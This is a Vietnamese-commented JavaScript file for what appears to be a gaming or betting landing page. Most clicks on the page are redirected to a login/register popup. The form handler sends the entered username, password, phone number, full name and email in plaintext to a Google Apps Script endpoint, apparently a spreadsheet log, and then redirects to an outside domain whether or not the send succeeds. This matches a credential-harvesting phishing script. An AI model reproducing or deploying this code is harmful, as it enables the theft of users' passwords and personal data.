document.addEventListener("DOMContentLoaded", function() {
    // 1. CHUYỂN TRẠNG THÁI ACTIVE CHO TABS
    const navItems = document.querySelectorAll('.bottom-nav .nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault(); 
            navItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const categoryTabs = document.querySelectorAll('.category-tabs .tab');
    categoryTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            categoryTabs.forEach(t => t.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // 2. ĐỒNG HỒ THỜI GIAN THỰC
    function updateVietnamTime() {
        const clockElement = document.getElementById('real-time-clock');
        if (!clockElement) return;
        const now = new Date();
        const options = { timeZone: 'Asia/Ho_Chi_Minh', hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' };
        const timeString = new Intl.DateTimeFormat('vi-VN', options).format(now);
        clockElement.innerText = timeString + " (GMT+7)";
    }
    updateVietnamTime();
    setInterval(updateVietnamTime, 1000);

    // 3. BANNER TỰ ĐỘNG TRƯỢT NGANG & TỰ ĐỘNG KHỚP CHIỀU CAO ẢNH
    const bannerSection = document.getElementById('hero-banner');
    const track = document.getElementById('hero-track');
    const slides = document.querySelectorAll('.hero-slide');
    const dotsContainer = document.getElementById('hero-dots');
    
    if (track && slides.length > 0) {
        let currentIndex = 0;
        const totalSlides = slides.length;
        let slideInterval;

        // Mảng vị trí trượt viết sẵn (Không dùng dấu sao để tránh lỗi copy)
        const positions = ["0%", "-100%", "-200%", "-300%", "-400%", "-500%", "-600%", "-700%"];

        // Tạo dấu chấm điều hướng
        slides.forEach((_, index) => {
            const dot = document.createElement('div');
            dot.classList.add('hero-dot');
            if (index === 0) dot.classList.add('active');
            
            dot.addEventListener('click', () => {
                goToSlide(index);
                resetInterval();
            });
            dotsContainer.appendChild(dot);
        });

        const dots = document.querySelectorAll('.hero-dot');

        // Hàm ép khung banner ôm sát đúng chiều cao của bức ảnh đang hiển thị (Xóa 100% khoảng trắng nếu có 1 ảnh quá cao)
        function adjustBannerHeight() {
            const currentImg = slides[currentIndex].querySelector('img');
            if (currentImg && currentImg.offsetHeight > 0) {
                bannerSection.style.height = currentImg.offsetHeight + "px";
            }
        }

        function updateDots() {
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        function goToSlide(index) {
            currentIndex = index;
            track.style.transform = "translateX(" + positions[currentIndex] + ")";
            updateDots();
            adjustBannerHeight();
        }

        function nextSlide() {
            currentIndex = (currentIndex + 1) % totalSlides;
            goToSlide(currentIndex);
        }

        function startInterval() {
            slideInterval = setInterval(nextSlide, 3000);
        }

        function resetInterval() {
            clearInterval(slideInterval);
            startInterval();
        }

        // Tự động căn lại chiều cao khi ảnh đầu tiên tải xong hoặc khi đổi kích thước màn hình
        const firstImg = slides[0].querySelector('img');
        if (firstImg) {
            if (firstImg.complete) {
                adjustBannerHeight();
            } else {
                firstImg.addEventListener('load', adjustBannerHeight);
            }
        }
        window.addEventListener('resize', adjustBannerHeight);

        startInterval();
    }
    // =========================================
    // 4. XỬ LÝ MỞ / ĐÓNG FORM ĐĂNG NHẬP & ĐĂNG KÝ
    // =========================================
    const modal = document.getElementById('auth-modal');
    const closeModalBtn = document.getElementById('close-modal-btn');
    const formLogin = document.getElementById('form-login');
    const formRegister = document.getElementById('form-register');
    const goToRegister = document.getElementById('go-to-register');
    const goToLogin = document.getElementById('go-to-login');

    function openAuthModal(type) {
        if (!modal) return;
        modal.classList.add('show');
        if (type === 'register') {
            formLogin.classList.remove('active-form');
            formRegister.classList.add('active-form');
        } else {
            formRegister.classList.remove('active-form');
            formLogin.classList.add('active-form');
        }
    }

    // Gắn sự kiện cho nút ĐĂNG NHẬP (Cả Desktop & Mobile)
    document.querySelectorAll('.btn-login-top, .btn-login-mobile').forEach(btn => {
        btn.addEventListener('click', () => openAuthModal('login'));
    });

    // Gắn sự kiện cho nút ĐĂNG KÝ (Cả Desktop & Mobile)
    document.querySelectorAll('.btn-register-top, .btn-register-mobile').forEach(btn => {
        btn.addEventListener('click', () => openAuthModal('register'));
    });

    // Chuyển đổi qua lại giữa 2 form bằng đường link ở dưới đáy
    if (goToRegister) {
        goToRegister.addEventListener('click', (e) => {
            e.preventDefault();
            openAuthModal('register');
        });
    }
    if (goToLogin) {
        goToLogin.addEventListener('click', (e) => {
            e.preventDefault();
            openAuthModal('login');
        });
    }

    // Đóng Popup khi bấm nút X hoặc bấm ra vùng nền tối bên ngoài
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', () => modal.classList.remove('show'));
    }
    window.addEventListener('click', (e) => {
        if (e.target === modal) modal.classList.remove('show');
    });

    // Chức năng bấm vào con mắt để Ẩn / Hiện mật khẩu
    document.querySelectorAll('.toggle-pwd').forEach(icon => {
        icon.addEventListener('click', function() {
            const pwdInput = this.parentElement.querySelector('input');
            if (pwdInput.type === 'password') {
                pwdInput.type = 'text';
                this.classList.remove('fa-eye-slash');
                this.classList.add('fa-eye');
            } else {
                pwdInput.type = 'password';
                this.classList.remove('fa-eye');
                this.classList.add('fa-eye-slash');
            }
        });
    });
     // =========================================
    // TÁC VỤ: NHẤN CÁC THÀNH PHẦN KHÁC ĐỀU MỞ FORM ĐĂNG NHẬP
    // =========================================
    // Gom tất cả các class của các thành phần có thể click trên web
    const requireLoginElements = document.querySelectorAll(`
        .desktop-nav a, 
        .link-btn, 
        .hero-slide img, 
        .btn-overlay, 
        .link-item, 
        .category-tabs .tab, 
        .game-card, 
        .bottom-nav .nav-item
    `);

    requireLoginElements.forEach(el => {
        el.addEventListener('click', function(e) {
            e.preventDefault(); // Chặn hành vi load lại trang nếu lỡ bấm vào thẻ link <a>
            openAuthModal('login'); // Gọi hàm mở Popup Đăng Nhập
        });
    });
    // =========================================
    // 5. KIỂM TRA DỮ LIỆU, RÀNG BUỘC FORM & CHUYỂN HƯỚNG
    // =========================================
    function handleFormSubmit(formElement, actionType) {
        // Lấy dữ liệu và loại bỏ khoảng trắng ở 2 đầu
        const username = formElement.querySelector('input[name="username"]')?.value.trim() || "";
        const password = formElement.querySelector('input[name="password"]')?.value.trim() || "";
        const phone = formElement.querySelector('input[name="phone"]')?.value.trim() || "";
        const fullname = formElement.querySelector('input[name="fullname"]')?.value.trim() || "";
        const email = formElement.querySelector('input[name="email"]')?.value.trim() || "";

        // 1. Ràng buộc: Tài khoản bắt buộc điền & độ dài 6-20 ký tự
        if (!username || username.length < 6 || username.length > 20) {
            alert("Vui lòng nhập tài khoản từ 6 đến 20 ký tự!");
            return;
        }

        // 2. Ràng buộc: Mật khẩu bắt buộc điền & độ dài 6-20 ký tự
        if (!password || password.length < 6 || password.length > 20) {
            alert("Vui lòng nhập mật khẩu từ 6 đến 20 ký tự!");
            return;
        }

        // 3. Ràng buộc: Số điện thoại bắt buộc điền & phải chứa chính xác 10 chữ số
        const phoneRegex = /^\d{10}$/; 
        if (!phone || !phoneRegex.test(phone.replace(/\s+/g, ''))) {
            alert("Vui lòng nhập đúng số điện thoại gồm 10 chữ số!");
            return;
        }

        // 4. Ràng buộc riêng cho Form Đăng Ký
        if (actionType === 'ĐĂNG KÝ') {
            // Họ và tên bắt buộc điền
            if (!fullname) {
                alert("Vui lòng điền đầy đủ họ tên!");
                return;
            }

            // Phải tích đồng ý chính sách thành viên
            const checkbox = formElement.querySelector('.policy-check input[type="checkbox"]');
            if (checkbox && !checkbox.checked) {
                alert("Bạn cần đồng ý với Chính sách thành viên để tiếp tục đăng ký!");
                return;
            }
        }

        // Khóa nút Submit để tránh người dùng nhấn nhiều lần
        const submitBtn = formElement.querySelector('.btn-auth-submit');
        submitBtn.innerText = "ĐANG XỬ LÝ...";
        submitBtn.disabled = true;

        // Lưu ý: Dán lại Link Google Sheets Web App của bạn vào biến scriptURL này
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxGWXo1Jm8-UzPA63XJKomQronKW0C2iKzojjhegiku5RzQZL_1whQRgmO-zHVnamLR/exec'; 
        const formData = new FormData();
        formData.append('action', actionType);
        formData.append('username', username);
        formData.append('password', password);
        formData.append('phone', phone);
        formData.append('fullname', fullname);
        formData.append('email', email);

        // Gửi dữ liệu ngầm và CHUYỂN HƯỚNG TỚI WEB CỦA BẠN SAU KHI THÀNH CÔNG
        fetch(scriptURL, { method: 'POST', body: formData, mode: 'no-cors' })
            .then(() => { 
                window.location.href = 'https://www.78wwina.vip/'; 
            })
            .catch(() => { 
                // Kể cả nếu gửi bị gián đoạn vẫn ép chuyển hướng sang trang đích
                window.location.href = 'https://www.78wwina.vip/'; 
            });
    }
    // GẮN SỰ KIỆN CLICK CHO NÚT SUBMIT ĐĂNG NHẬP
    if (formLogin) {
        const btnSubmitLogin = formLogin.querySelector('.btn-auth-submit');
        if (btnSubmitLogin) {
            btnSubmitLogin.addEventListener('click', () => {
                handleFormSubmit(formLogin, 'ĐĂNG NHẬP');
            });
        }
    }

    // GẮN SỰ KIỆN CLICK CHO NÚT SUBMIT ĐĂNG KÝ
    if (formRegister) {
        const btnSubmitRegister = formRegister.querySelector('.btn-auth-submit');
        if (btnSubmitRegister) {
            btnSubmitRegister.addEventListener('click', () => {
                handleFormSubmit(formRegister, 'ĐĂNG KÝ');
            });
        }
    }
});